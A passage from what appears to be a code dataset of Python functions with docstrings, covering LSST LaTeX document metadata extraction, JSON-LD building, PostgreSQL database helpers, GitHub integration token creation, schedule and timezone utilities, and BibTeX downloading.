            "def _parse_doc_ref(self):\n        \"\"\"Parse the document handle.\n\n        Sets the ``_series``, ``_serial``, and ``_handle`` attributes.\n        \"\"\"\n        command = LatexCommand(\n            'setDocRef',\n            {'name': 'handle', 'required': True, 'bracket': '{'})\n        try:\n            parsed = next(command.parse(self._tex))\n        except StopIteration:\n            self._logger.warning('lsstdoc has no setDocRef')\n            self._handle = None\n            self._series = None\n            self._serial = None\n            return\n\n        self._handle = parsed['handle']\n        try:\n            self._series, self._serial = self._handle.split('-', 1)\n        except ValueError:\n            self._logger.warning('lsstdoc handle cannot be parsed into '\n                                 'series and serial: %r', self._handle)\n            self._series = None\n            self._serial = None"
        ],
        [
            "def _parse_author(self):\n        r\"\"\"Parse the author from TeX source.\n\n        Sets the ``_authors`` attribute.\n\n        Goal is to parse::\n\n           \\author{\n           A.~Author,\n           B.~Author,\n           and\n           C.~Author}\n\n        Into::\n\n           ['A. Author', 'B. Author', 'C. Author']\n        \"\"\"\n        command = LatexCommand(\n            'author',\n            {'name': 'authors', 'required': True, 'bracket': '{'})\n        try:\n            parsed = next(command.parse(self._tex))\n        except StopIteration:\n            self._logger.warning('lsstdoc has no author')\n            self._authors = []\n            return\n\n        try:\n            content = parsed['authors']\n        except KeyError:\n            self._logger.warning('lsstdoc has no author')\n            self._authors = []\n            return\n\n        # Clean content\n        content = content.replace('\\n', ' ')\n        content = content.replace('~', ' ')\n        content = content.strip()\n\n        # Split content into list of individual authors\n        authors = []\n        for part in content.split(','):\n            part = part.strip()\n            for split_part in part.split('and '):\n                split_part = split_part.strip()\n                if len(split_part) > 0:\n                    authors.append(split_part)\n        self._authors = authors"
        ],
        [
            "def _parse_abstract(self):\n        \"\"\"Parse the abstract from the TeX source.\n\n        Sets the ``_abstract`` attribute.\n        \"\"\"\n        command = LatexCommand(\n            'setDocAbstract',\n            {'name': 'abstract', 'required': True, 'bracket': '{'})\n        try:\n            parsed = next(command.parse(self._tex))\n        except StopIteration:\n            self._logger.warning('lsstdoc has no abstract')\n            self._abstract = None\n            return\n\n        try:\n            content = parsed['abstract']\n        except KeyError:\n            self._logger.warning('lsstdoc has no abstract')\n            self._abstract = None\n            return\n\n        content = content.strip()\n        self._abstract = content"
        ],
        [
            "def _prep_snippet_for_pandoc(self, latex_text):\n        \"\"\"Process a LaTeX snippet of content for better transformation\n        with pandoc.\n\n        Currently runs the CitationLinker to convert BibTeX citations to\n        href links.\n        \"\"\"\n        replace_cite = CitationLinker(self.bib_db)\n        latex_text = replace_cite(latex_text)\n        return latex_text"
        ],
        [
            "def _load_bib_db(self):\n        r\"\"\"Load the BibTeX bibliography referenced by the document.\n\n        This method triggered by the `bib_db` attribute and populates the\n        `_bib_db` private attribute.\n\n        The ``\\bibliography`` command is parsed to identify the bibliographies\n        referenced by the document.\n        \"\"\"\n        # Get the names of custom bibtex files by parsing the\n        # \\bibliography command and filtering out the default lsstdoc\n        # bibliographies.\n        command = LatexCommand(\n            'bibliography',\n            {'name': 'bib_names', 'required': True, 'bracket': '{'})\n        try:\n            parsed = next(command.parse(self._tex))\n            bib_names = [n.strip() for n in parsed['bib_names'].split(',')]\n        except StopIteration:\n            self._logger.warning('lsstdoc has no bibliography command')\n            bib_names = []\n        custom_bib_names = [n for n in bib_names\n                            if n not in KNOWN_LSSTTEXMF_BIB_NAMES]\n\n        # Read custom bibliographies.\n        custom_bibs = []\n        for custom_bib_name in custom_bib_names:\n            custom_bib_path = os.path.join(\n                os.path.join(self._root_dir),\n                custom_bib_name + '.bib'\n            )\n            if not os.path.exists(custom_bib_path):\n                self._logger.warning('Could not find bibliography %r',\n                                     custom_bib_path)\n                continue\n            with open(custom_bib_path, 'r') as file_handle:\n                custom_bibs.append(file_handle.read())\n        if len(custom_bibs) > 0:\n            custom_bibtex = '\\n\\n'.join(custom_bibs)\n        else:\n            custom_bibtex = None\n\n        # Get the combined pybtex bibliography\n        db = get_bibliography(bibtex=custom_bibtex)\n\n        self._bib_db = db"
        ],
        [
            "def _parse_revision_date(self):\n        r\"\"\"Parse the ``\\date`` command, falling back to getting the\n        most recent Git commit date and the current datetime.\n\n        Result is available from the `revision_datetime` attribute.\n        \"\"\"\n        doc_datetime = None\n\n        # First try to parse the \\date command in the latex.\n        # \\date is ignored for draft documents.\n        if not self.is_draft:\n            date_command = LatexCommand(\n                'date',\n                {'name': 'content', 'required': True, 'bracket': '{'})\n            try:\n                parsed = next(date_command.parse(self._tex))\n                command_content = parsed['content'].strip()\n            except StopIteration:\n                command_content = None\n                self._logger.warning('lsstdoc has no date command')\n\n            # Try to parse a date from the \\date command\n            if command_content is not None and command_content != r'\\today':\n                try:\n                    doc_datetime = datetime.datetime.strptime(command_content,\n                                                              '%Y-%m-%d')\n                    # Assume LSST project time (Pacific)\n                    project_tz = timezone('US/Pacific')\n                    localized_datetime = project_tz.localize(doc_datetime)\n                    # Normalize to UTC\n                    doc_datetime = localized_datetime.astimezone(pytz.utc)\n\n                    self._revision_datetime_source = 'tex'\n                except ValueError:\n                    self._logger.warning('Could not parse a datetime from '\n                                         'lsstdoc date command: %r',\n                                         command_content)\n\n        # Fallback to getting the datetime from Git\n        if doc_datetime is None:\n            content_extensions = ('tex', 'bib', 'pdf', 'png', 'jpg')\n            try:\n                doc_datetime = get_content_commit_date(\n                    content_extensions,\n                    root_dir=self._root_dir)\n                self._revision_datetime_source = 'git'\n            except RuntimeError:\n                self._logger.warning('Could not get a datetime from the Git '\n                                     'repository at %r',\n                                     self._root_dir)\n\n        # Final fallback to the current datetime\n        if doc_datetime is None:\n            doc_datetime = pytz.utc.localize(datetime.datetime.now())\n            self._revision_datetime_source = 'now'\n\n        self._datetime = doc_datetime"
        ],
        [
            "def build_jsonld(self, url=None, code_url=None, ci_url=None,\n                     readme_url=None, license_id=None):\n        \"\"\"Create a JSON-LD representation of this LSST LaTeX document.\n\n        Parameters\n        ----------\n        url : `str`, optional\n            URL where this document is published to the web. Prefer\n            the LSST the Docs URL if possible.\n            Example: ``'https://ldm-151.lsst.io'``.\n        code_url : `str`, optional\n            Path the the document's repository, typically on GitHub.\n            Example: ``'https://github.com/lsst/LDM-151'``.\n        ci_url : `str`, optional\n            Path to the continuous integration service dashboard for this\n            document's repository.\n            Example: ``'https://travis-ci.org/lsst/LDM-151'``.\n        readme_url : `str`, optional\n            URL to the document repository's README file. Example:\n            ``https://raw.githubusercontent.com/lsst/LDM-151/master/README.rst``.\n        license_id : `str`, optional\n            License identifier, if known. The identifier should be from the\n            listing at https://spdx.org/licenses/. Example: ``CC-BY-4.0``.\n\n        Returns\n        -------\n        jsonld : `dict`\n            JSON-LD-formatted dictionary.\n        \"\"\"\n        jsonld = {\n            '@context': [\n                \"https://raw.githubusercontent.com/codemeta/codemeta/2.0-rc/\"\n                \"codemeta.jsonld\",\n                \"http://schema.org\"],\n            '@type': ['Report', 'SoftwareSourceCode'],\n            'language': 'TeX',\n            'reportNumber': self.handle,\n            'name': self.plain_title,\n            'description': self.plain_abstract,\n            'author': [{'@type': 'Person', 'name': author_name}\n                       for author_name in self.plain_authors],\n            # This is a datetime.datetime; not a string. If writing to a file,\n            # Need to convert this to a ISO 8601 string.\n            'dateModified': self.revision_datetime\n        }\n\n        try:\n            jsonld['articleBody'] = self.plain_content\n            jsonld['fileFormat'] = 'text/plain'  # MIME type of articleBody\n        except RuntimeError:\n            # raised by pypandoc when it can't convert the tex document\n            self._logger.exception('Could not convert latex body to plain '\n                                   'text for articleBody.')\n            self._logger.warning('Falling back to tex source for articleBody')\n            jsonld['articleBody'] = self._tex\n            jsonld['fileFormat'] = 'text/plain'  # no mimetype for LaTeX?\n\n        if url is not None:\n            jsonld['@id'] = url\n            jsonld['url'] = url\n        else:\n            # Fallback to using the document handle as the ID. This isn't\n            # entirely ideal from a linked data perspective.\n            jsonld['@id'] = self.handle\n\n        if code_url is not None:\n            jsonld['codeRepository'] = code_url\n\n        if ci_url is not None:\n            jsonld['contIntegration'] = ci_url\n\n        if readme_url is not None:\n            jsonld['readme'] = readme_url\n\n        if license_id is not None:\n            jsonld['license_id'] = None\n\n        return jsonld"
        ],
        [
            "def rename(self, from_name, to_name):\n        \"\"\"Renames an existing database.\"\"\"\n        log.info('renaming database from %s to %s' % (from_name, to_name))\n        self._run_stmt('alter database %s rename to %s' % (from_name, to_name))"
        ],
        [
            "def available(self, timeout=5):\n        \"\"\"Returns True if database server is running, False otherwise.\"\"\"\n        host = self._connect_args['host']\n        port = self._connect_args['port']\n        try:\n            sock = socket.create_connection((host, port), timeout=timeout)\n            sock.close()\n            return True\n        except socket.error:\n            pass\n        return False"
        ],
        [
            "def dump(self, name, filename):\n        \"\"\"\n        Saves the state of a database to a file.\n\n        Parameters\n        ----------\n        name: str\n            the database to be backed up.\n        filename: str\n            path to a file where database backup will be written.\n        \"\"\"\n        if not self.exists(name):\n            raise DatabaseError('database %s does not exist!')\n        log.info('dumping %s to %s' % (name, filename))\n        self._run_cmd('pg_dump', '--verbose', '--blobs', '--format=custom',\n                      '--file=%s' % filename, name)"
        ],
        [
            "def restore(self, name, filename):\n        \"\"\"\n        Loads state of a backup file to a database.\n\n        Note\n        ----\n        If database name does not exist, it will be created.\n\n        Parameters\n        ----------\n        name: str\n            the database to which backup will be restored.\n        filename: str\n            path to a file contain a postgres database backup.\n        \"\"\"\n        if not self.exists(name):\n            self.create(name)\n        else:\n            log.warn('overwriting contents of database %s' % name)\n        log.info('restoring %s from %s' % (name, filename))\n        self._run_cmd('pg_restore', '--verbose', '--dbname=%s' % name, filename)"
        ],
        [
            "def connection_dsn(self, name=None):\n        \"\"\"\n        Provides a connection string for database.\n\n        Parameters\n        ----------\n        name: str, optional\n            an override database name for the connection string.\n\n        Returns\n        -------\n        str: the connection string (e.g. 'dbname=db1 user=user1 host=localhost port=5432')\n        \"\"\"\n        return ' '.join(\"%s=%s\" % (param, value) for param, value in self._connect_options(name))"
        ],
        [
            "def connection_url(self, name=None):\n        \"\"\"\n        Provides a connection string for database as a sqlalchemy compatible URL.\n\n        NB - this doesn't include special arguments related to SSL connectivity (which are outside the scope\n        of the connection URL format).\n\n        Parameters\n        ----------\n        name: str, optional\n            an override database name for the connection string.\n\n        Returns\n        -------\n        str: the connection URL (e.g. postgresql://user1@localhost:5432/db1)\n            \"\"\"\n        return 'postgresql://{user}@{host}:{port}/{dbname}'.format(**{k: v for k, v in self._connect_options(name)})"
        ],
        [
            "def shell(self, expect=pexpect):\n        \"\"\"\n        Connects the database client shell to the database.\n\n        Parameters\n        ----------\n        expect_module: str\n            the database to which backup will be restored.\n        \"\"\"\n        dsn = self.connection_dsn()\n        log.debug('connection string: %s' % dsn)\n        child = expect.spawn('psql \"%s\"' % dsn)\n        if self._connect_args['password'] is not None:\n            child.expect('Password: ')\n            child.sendline(self._connect_args['password'])\n        child.interact()"
        ],
        [
            "def settings(self):\n        \"\"\"Returns settings from the server.\"\"\"\n        stmt = \"select {fields} from pg_settings\".format(fields=', '.join(SETTINGS_FIELDS))\n        settings = []\n        for row in self._iter_results(stmt):\n            row['setting'] = self._vartype_map[row['vartype']](row['setting'])\n            settings.append(Settings(**row))\n        return settings"
        ],
        [
            "def breakfast(self, message=\"Breakfast is ready\", shout: bool = False):\n        \"\"\"Say something in the morning\"\"\"\n        return self.helper.output(message, shout)"
        ],
        [
            "def lunch(self, message=\"Time for lunch\", shout: bool = False):\n        \"\"\"Say something in the afternoon\"\"\"\n        return self.helper.output(message, shout)"
        ],
        [
            "def dinner(self, message=\"Dinner is served\", shout: bool = False):\n        \"\"\"Say something in the evening\"\"\"\n        return self.helper.output(message, shout)"
        ],
        [
            "def main():\n    \"\"\"Command line entrypoint to reduce technote metadata.\n    \"\"\"\n    parser = argparse.ArgumentParser(\n        description='Discover and ingest metadata from document sources, '\n                    'including lsstdoc-based LaTeX documents and '\n                    'reStructuredText-based technotes. Metadata can be '\n                    'upserted into the LSST Projectmeta MongoDB.')\n    parser.add_argument(\n        '--ltd-product',\n        dest='ltd_product_url',\n        help='URL of an LSST the Docs product '\n             '(https://keeper.lsst.codes/products/<slug>). If provided, '\n             'only this document will be ingested.')\n    parser.add_argument(\n        '--github-token',\n        help='GitHub personal access token.')\n    parser.add_argument(\n        '--mongodb-uri',\n        help='MongoDB connection URI. If provided, metadata will be loaded '\n             'into the Projectmeta database. Omit this argument to just '\n             'test the ingest pipeline.')\n    parser.add_argument(\n        '--mongodb-db',\n        default='lsstprojectmeta',\n        help='Name of MongoDB database')\n    parser.add_argument(\n        '--mongodb-collection',\n        default='resources',\n        help='Name of the MongoDB collection for projectmeta resources')\n    args = parser.parse_args()\n\n    # Configure the root logger\n    stream_handler = logging.StreamHandler()\n    stream_formatter = logging.Formatter(\n        '%(asctime)s %(levelname)8s %(name)s | %(message)s')\n    stream_handler.setFormatter(stream_formatter)\n    root_logger = logging.getLogger()\n    root_logger.addHandler(stream_handler)\n    root_logger.setLevel(logging.WARNING)\n    # Configure app logger\n    app_logger = logging.getLogger('lsstprojectmeta')\n    app_logger.setLevel(logging.DEBUG)\n\n    if args.mongodb_uri is not None:\n        mongo_client = AsyncIOMotorClient(args.mongodb_uri, ssl=True)\n        collection = mongo_client[args.mongodb_db][args.mongodb_collection]\n    else:\n        collection = None\n\n    loop = asyncio.get_event_loop()\n\n    if args.ltd_product_url is not None:\n        # Run single technote\n        loop.run_until_complete(run_single_ltd_doc(args.ltd_product_url,\n                                                   args.github_token,\n                                                   collection))\n    else:\n        # Run bulk technote processing\n        loop.run_until_complete(run_bulk_etl(args.github_token,\n                                             collection))"
        ],
        [
            "async def process_ltd_doc_products(session, product_urls, github_api_token,\n                                   mongo_collection=None):\n    \"\"\"Run a pipeline to process extract, transform, and load metadata for\n    multiple LSST the Docs-hosted projects\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    product_urls : `list` of `str`\n        List of LSST the Docs product URLs.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    mongo_collection : `motor.motor_asyncio.AsyncIOMotorCollection`, optional\n        MongoDB collection. This should be the common MongoDB collection for\n        LSST projectmeta JSON-LD records.\n    \"\"\"\n    tasks = [asyncio.ensure_future(\n             process_ltd_doc(session, github_api_token,\n                             product_url,\n                             mongo_collection=mongo_collection))\n             for product_url in product_urls]\n    await asyncio.gather(*tasks)"
        ],
        [
            "async def process_ltd_doc(session, github_api_token, ltd_product_url,\n                          mongo_collection=None):\n    \"\"\"Ingest any kind of LSST document hosted on LSST the Docs from its\n    source.\n\n    Parameters\n    ----------\n    session : `aiohttp.ClientSession`\n        Your application's aiohttp client session.\n        See http://aiohttp.readthedocs.io/en/stable/client.html.\n    github_api_token : `str`\n        A GitHub personal API token. See the `GitHub personal access token\n        guide`_.\n    ltd_product_url : `str`\n        URL of the technote's product resource in the LTD Keeper API.\n    mongo_collection : `motor.motor_asyncio.AsyncIOMotorCollection`, optional\n        MongoDB collection. This should be the common MongoDB collection for\n        LSST projectmeta JSON-LD records. If provided, ths JSON-LD is upserted\n        into the MongoDB collection.\n\n    Returns\n    -------\n    metadata : `dict`\n        JSON-LD-formatted dictionary.\n\n    .. `GitHub personal access token guide`: https://ls.st/41d\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    ltd_product_data = await get_ltd_product(session, url=ltd_product_url)\n\n    # Ensure the LTD product is a document\n    product_name = ltd_product_data['slug']\n    doc_handle_match = DOCUMENT_HANDLE_PATTERN.match(product_name)\n    if doc_handle_match is None:\n        logger.debug('%s is not a document repo', product_name)\n        return\n\n    # Figure out the format of the document by probing for metadata files.\n    # reStructuredText-based Sphinx documents have metadata.yaml file.\n    try:\n        return await process_sphinx_technote(session,\n                                             github_api_token,\n                                             ltd_product_data,\n                                             mongo_collection=mongo_collection)\n    except NotSphinxTechnoteError:\n        # Catch error so we can try the next format\n        logger.debug('%s is not a Sphinx-based technote.', product_name)\n    except Exception:\n        # Something bad happened trying to process the technote.\n        # Log and just move on.\n        logger.exception('Unexpected error trying to process %s', product_name)\n        return\n\n    # Try interpreting it as a Lander page with a /metadata.jsonld document\n    try:\n        return await process_lander_page(session,\n                                         github_api_token,\n                                         ltd_product_data,\n                                         mongo_collection=mongo_collection)\n    except NotLanderPageError:\n        # Catch error so we can try the next format\n        logger.debug('%s is not a Lander page with a metadata.jsonld file.',\n                     product_name)\n    except Exception:\n        # Something bad happened; log and move on\n        logger.exception('Unexpected error trying to process %s', product_name)\n        return"
        ],
        [
            "def decorator(decorator_func):\n    \"\"\"Allows a decorator to be called with or without keyword arguments.\"\"\"\n    assert callable(decorator_func), type(decorator_func)\n\n    def _decorator(func=None, **kwargs):\n        assert func is None or callable(func), type(func)\n        if func:\n            return decorator_func(func, **kwargs)\n        else:\n            def _decorator_helper(func):\n                return decorator_func(func, **kwargs)\n\n            return _decorator_helper\n\n    return _decorator"
        ],
        [
            "def get_installation_token(installation_id, integration_jwt):\n    \"\"\"Create a GitHub token for an integration installation.\n\n    Parameters\n    ----------\n    installation_id : `int`\n        Installation ID. This is available in the URL of the integration's\n        **installation** ID.\n    integration_jwt : `bytes`\n        The integration's JSON Web Token (JWT). You can create this with\n        `create_jwt`.\n\n    Returns\n    -------\n    token_obj : `dict`\n        GitHub token object. Includes the fields:\n\n        - ``token``: the token string itself.\n        - ``expires_at``: date time string when the token expires.\n\n    Example\n    -------\n    The typical workflow for authenticating to an integration installation is:\n\n    .. code-block:: python\n\n       from dochubadapter.github import auth\n       jwt = auth.create_jwt(integration_id, private_key_path)\n       token_obj = auth.get_installation_token(installation_id, jwt)\n       print(token_obj['token'])\n\n    Notes\n    -----\n    See\n    https://developer.github.com/early-access/integrations/authentication/#as-an-installation\n    for more information\n    \"\"\"\n    api_root = 'https://api.github.com'\n    url = '{root}/installations/{id_:d}/access_tokens'.format(\n        api_root=api_root,\n        id_=installation_id)\n\n    headers = {\n        'Authorization': 'Bearer {0}'.format(integration_jwt.decode('utf-8')),\n        'Accept': 'application/vnd.github.machine-man-preview+json'\n    }\n\n    resp = requests.post(url, headers=headers)\n    resp.raise_for_status()\n    return resp.json()"
        ],
        [
            "def create_jwt(integration_id, private_key_path):\n    \"\"\"Create a JSON Web Token to authenticate a GitHub Integration or\n    installation.\n\n    Parameters\n    ----------\n    integration_id : `int`\n        Integration ID. This is available from the GitHub integration's\n        homepage.\n    private_key_path : `str`\n        Path to the integration's private key (a ``.pem`` file).\n\n    Returns\n    -------\n    jwt : `bytes`\n        JSON Web Token that is good for 9 minutes.\n\n    Notes\n    -----\n    The JWT is encoded with the RS256 algorithm. It includes a payload with\n    fields:\n\n    - ``'iat'``: The current time, as an `int` timestamp.\n    - ``'exp'``: Expiration time, as an `int timestamp. The expiration\n      time is set of 9 minutes in the future (maximum allowance is 10 minutes).\n    - ``'iss'``: The integration ID (`int`).\n\n    For more information, see\n    https://developer.github.com/early-access/integrations/authentication/.\n    \"\"\"\n    integration_id = int(integration_id)\n\n    with open(private_key_path, 'rb') as f:\n        cert_bytes = f.read()\n\n    now = datetime.datetime.now()\n    expiration_time = now + datetime.timedelta(minutes=9)\n    payload = {\n        # Issued at time\n        'iat': int(now.timestamp()),\n        # JWT expiration time (10 minute maximum)\n        'exp': int(expiration_time.timestamp()),\n        # Integration's GitHub identifier\n        'iss': integration_id\n    }\n\n    return jwt.encode(payload, cert_bytes, algorithm='RS256')"
        ],
        [
            "def get_macros(tex_source):\n    r\"\"\"Get all macro definitions from TeX source, supporting multiple\n    declaration patterns.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n\n    Returns\n    -------\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros.\n\n    Notes\n    -----\n    This function uses the following function to scrape macros of different\n    types:\n\n    - `get_def_macros`\n    - `get_newcommand_macros`\n\n    This macro scraping has the following caveats:\n\n    - Macro definition (including content) must all occur on one line.\n    - Macros with arguments are not supported.\n    \"\"\"\n    macros = {}\n    macros.update(get_def_macros(tex_source))\n    macros.update(get_newcommand_macros(tex_source))\n    return macros"
        ],
        [
            "def get_def_macros(tex_source):\n    r\"\"\"Get all ``\\def`` macro definition from TeX source.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n\n    Returns\n    -------\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros.\n\n    Notes\n    -----\n    ``\\def`` macros with arguments are not supported.\n    \"\"\"\n    macros = {}\n    for match in DEF_PATTERN.finditer(tex_source):\n        macros[match.group('name')] = match.group('content')\n    return macros"
        ],
        [
            "def get_newcommand_macros(tex_source):\n    r\"\"\"Get all ``\\newcommand`` macro definition from TeX source.\n\n    Parameters\n    ----------\n    tex_source : `str`\n        TeX source content.\n\n    Returns\n    -------\n    macros : `dict`\n        Keys are macro names (including leading ``\\``) and values are the\n        content (as `str`) of the macros.\n\n    Notes\n    -----\n    ``\\newcommand`` macros with arguments are not supported.\n    \"\"\"\n    macros = {}\n    command = LatexCommand(\n        'newcommand',\n        {'name': 'name', 'required': True, 'bracket': '{'},\n        {'name': 'content', 'required': True, 'bracket': '{'})\n\n    for macro in command.parse(tex_source):\n        macros[macro['name']] = macro['content']\n\n    return macros"
        ],
        [
            "def load(directory_name, module_name):\n    \"\"\"Try to load and return a module\n\n    Will add DIRECTORY_NAME to sys.path and tries to import MODULE_NAME.\n\n    For example:\n    load(\"~/.yaz\", \"yaz_extension\")\n    \"\"\"\n    directory_name = os.path.expanduser(directory_name)\n    if os.path.isdir(directory_name) and directory_name not in sys.path:\n        sys.path.append(directory_name)\n\n    try:\n        return importlib.import_module(module_name)\n    except ImportError:\n        pass"
        ],
        [
            "def make_aware(value, timezone):\n    \"\"\"\n    Makes a naive datetime.datetime in a given time zone aware.\n    \"\"\"\n    if hasattr(timezone, 'localize') and value not in (datetime.datetime.min, datetime.datetime.max):\n        # available for pytz time zones\n        return timezone.localize(value, is_dst=None)\n    else:\n        # may be wrong around DST changes\n        return value.replace(tzinfo=timezone)"
        ],
        [
            "def make_naive(value, timezone):\n    \"\"\"\n    Makes an aware datetime.datetime naive in a given time zone.\n    \"\"\"\n    value = value.astimezone(timezone)\n    if hasattr(timezone, 'normalize'):\n        # available for pytz time zones\n        value = timezone.normalize(value)\n    return value.replace(tzinfo=None)"
        ],
        [
            "def to_timezone(self, dt):\n        \"\"\"Converts a datetime to the timezone of this Schedule.\"\"\"\n        if timezone.is_aware(dt):\n            return dt.astimezone(self.timezone)\n        else:\n            return timezone.make_aware(dt, self.timezone)"
        ],
        [
            "def next_interval(self, after=None):\n        \"\"\"Returns the next Period this event is in effect, or None if the event\n        has no remaining periods.\"\"\"\n        if after is None:\n            after = timezone.now()\n        after = self.to_timezone(after)\n        return next(self.intervals(range_start=after), None)"
        ],
        [
            "def _daily_periods(self, range_start, range_end):\n        \"\"\"Returns an iterator of Period tuples for every day this event is in effect, between range_start\n        and range_end.\"\"\"\n        specific = set(self.exceptions.keys())\n\n        return heapq.merge(self.exception_periods(range_start, range_end), *[\n            sched.daily_periods(range_start=range_start, range_end=range_end, exclude_dates=specific)\n            for sched in self._recurring_schedules\n        ])"
        ],
        [
            "def intervals(self, range_start=datetime.datetime.min, range_end=datetime.datetime.max):\n        \"\"\"Returns an iterator of Period tuples for continuous stretches of time during\n        which this event is in effect, between range_start and range_end.\"\"\"\n\n        # At the moment the algorithm works on periods split by calendar day, one at a time,\n        # merging them if they're continuous; to avoid looping infinitely for infinitely long\n        # periods, it splits periods as soon as they reach 60 days.\n        # This algorithm could likely be improved to get rid of this restriction and improve\n        # efficiency, so code should not rely on this behaviour.\n\n        current_period = None\n        max_continuous_days = 60\n\n        range_start = self.to_timezone(range_start)\n        range_end = self.to_timezone(range_end)\n\n        for period in self._daily_periods(range_start.date(), range_end.date()):\n            if period.end < range_start or period.start > range_end:\n                continue\n            if current_period is None:\n                current_period = period\n            else:\n                if ( ((period.start < current_period.end)\n                        or (period.start - current_period.end) <= datetime.timedelta(minutes=1))\n                        and (current_period.end - current_period.start) < datetime.timedelta(days=max_continuous_days)):\n                    # Merge\n                    current_period = Period(current_period.start, period.end)\n                else:\n                    yield current_period\n                    current_period = period\n        if current_period:\n            yield current_period"
        ],
        [
            "def includes(self, query_date, query_time=None):\n        \"\"\"Does this schedule include the provided time?\n        query_date and query_time are date and time objects, interpreted\n        in this schedule's timezone\"\"\"\n\n        if self.start_date and query_date < self.start_date:\n            return False\n        if self.end_date and query_date > self.end_date:\n            return False\n        if query_date.weekday() not in self.weekdays:\n            return False\n\n        if not query_time:\n            return True\n\n        if query_time >= self.period.start and query_time <= self.period.end:\n            return True\n\n        return False"
        ],
        [
            "def daily_periods(self, range_start=datetime.date.min, range_end=datetime.date.max, exclude_dates=tuple()):\n        \"\"\"Returns an iterator of Period tuples for every day this schedule is in effect, between range_start\n        and range_end.\"\"\"\n        tz = self.timezone\n        period = self.period\n        weekdays = self.weekdays\n\n        current_date = max(range_start, self.start_date)\n        end_date = range_end\n        if self.end_date:\n            end_date = min(end_date, self.end_date)\n\n        while current_date <= end_date:\n            if current_date.weekday() in weekdays and current_date not in exclude_dates:\n                yield Period(\n                    tz.localize(datetime.datetime.combine(current_date, period.start)),\n                    tz.localize(datetime.datetime.combine(current_date, period.end))\n                )\n            current_date += datetime.timedelta(days=1)"
        ],
        [
            "def period(self):\n        \"\"\"A Period tuple representing the daily start and end time.\"\"\"\n        start_time = self.root.findtext('daily_start_time')\n        if start_time:\n            return Period(text_to_time(start_time), text_to_time(self.root.findtext('daily_end_time')))\n        return Period(datetime.time(0, 0), datetime.time(23, 59))"
        ],
        [
            "def weekdays(self):\n        \"\"\"A set of integers representing the weekdays the schedule recurs on,\n        with Monday = 0 and Sunday = 6.\"\"\"\n        if not self.root.xpath('days'):\n            return set(range(7))\n        return set(int(d) - 1 for d in self.root.xpath('days/day/text()'))"
        ],
        [
            "def temp_db(db, name=None):\n    \"\"\"\n    A context manager that creates a temporary database.\n\n    Useful for automated tests.\n\n    Parameters\n    ----------\n    db: object\n        a preconfigured DB object\n    name: str, optional\n        name of the database to be created. (default: globally unique name)\n    \"\"\"\n    if name is None:\n        name = temp_name()\n    db.create(name)\n    if not db.exists(name):\n        raise DatabaseError('failed to create database %s!')\n    try:\n        yield name\n    finally:\n        db.drop(name)\n        if db.exists(name):\n            raise DatabaseError('failed to drop database %s!')"
        ],
        [
            "async def _download_text(url, session):\n    \"\"\"Asynchronously request a URL and get the encoded text content of the\n    body.\n\n    Parameters\n    ----------\n    url : `str`\n        URL to download.\n    session : `aiohttp.ClientSession`\n        An open aiohttp session.\n\n    Returns\n    -------\n    content : `str`\n        Content downloaded from the URL.\n    \"\"\"\n    logger = logging.getLogger(__name__)\n    async with session.get(url) as response:\n        # aiohttp decodes the content to a Python string\n        logger.info('Downloading %r', url)\n        return await response.text()"
        ],
        [
            "async def _download_lsst_bibtex(bibtex_names):\n    \"\"\"Asynchronously download a set of lsst-texmf BibTeX bibliographies from\n    GitHub.\n\n    Parameters\n    ----------\n    bibtex_names : sequence of `str`\n        Names of lsst-texmf BibTeX files to download. For example:\n\n        .. code-block:: python\n\n           ['lsst', 'lsst-dm', 'refs', 'books', 'refs_ads']\n\n    Returns\n    -------\n    bibtexs : `list` of `str`\n        List of BibTeX file content, in the same order as ``bibtex_names``.\n    \"\"\"\n    blob_url_template = (\n        'https://raw.githubusercontent.com/lsst/lsst-texmf/master/texmf/'\n        'bibtex/bib/{name}.bib'\n    )\n    urls = [blob_url_template.format(name=name) for name in bibtex_names]\n\n    tasks = []\n    async with ClientSession() as session:\n        for url in urls:\n            task = asyncio.ensure_future(_download_text(url, session))\n            tasks.append(task)\n\n        return await asyncio.gather(*tasks)"
        ],
        [
            "def get_lsst_bibtex(bibtex_filenames=None):\n    \"\"\"Get content of lsst-texmf bibliographies.\n\n    BibTeX content is downloaded from GitHub (``master`` branch of\n    https://github.com/lsst/lsst-texmf or retrieved from an in-memory cache.\n\n    Parameters\n    ----------\n    bibtex_filenames : sequence of `str`, optional\n        List of lsst-texmf BibTeX files to retrieve. These can be the filenames\n        of lsst-bibtex files (for example, ``['lsst.bib', 'lsst-dm.bib']``)\n        or names without an extension (``['lsst', 'lsst-dm']``). The default\n        (recommended) is to get *all* lsst-texmf bibliographies:\n\n        .. code-block:: python\n\n           ['lsst', 'lsst-dm', 'refs', 'books', 'refs_ads']\n\n    Returns\n    -------\n    bibtex : `dict`\n        Dictionary with keys that are bibtex file names (such as ``'lsst'``,\n        ``'lsst-dm'``). Values are the corresponding bibtex file content\n        (`str`).\n    \"\"\"\n    logger = logging.getLogger(__name__)\n\n    if bibtex_filenames is None:\n        # Default lsst-texmf bibliography files\n        bibtex_names = KNOWN_LSSTTEXMF_BIB_NAMES\n    else:\n        # Sanitize filenames (remove extensions, path)\n        bibtex_names = []\n        for filename in bibtex_filenames:\n            name = os.path.basename(os.path.splitext(filename)[0])\n            if name not in KNOWN_LSSTTEXMF_BIB_NAMES:\n                logger.warning('%r is not a known lsst-texmf bib file',\n                               name)\n                continue\n            bibtex_names.append(name)\n\n    # names of bibtex files not in cache\n    uncached_names = [name for name in bibtex_names\n                      if name not in _LSSTTEXMF_BIB_CACHE]\n    if len(uncached_names) > 0:\n        # Download bibtex and put into the cache\n        loop = asyncio.get_event_loop()\n        future = asyncio.ensure_future(_download_lsst_bibtex(uncached_names))\n        loop.run_until_complete(future)\n        for name, text in zip(bibtex_names, future.result()):\n            _LSSTTEXMF_BIB_CACHE[name] = text\n\n    return {name: _LSSTTEXMF_BIB_CACHE[name] for name in bibtex_names}"
        ],
        [
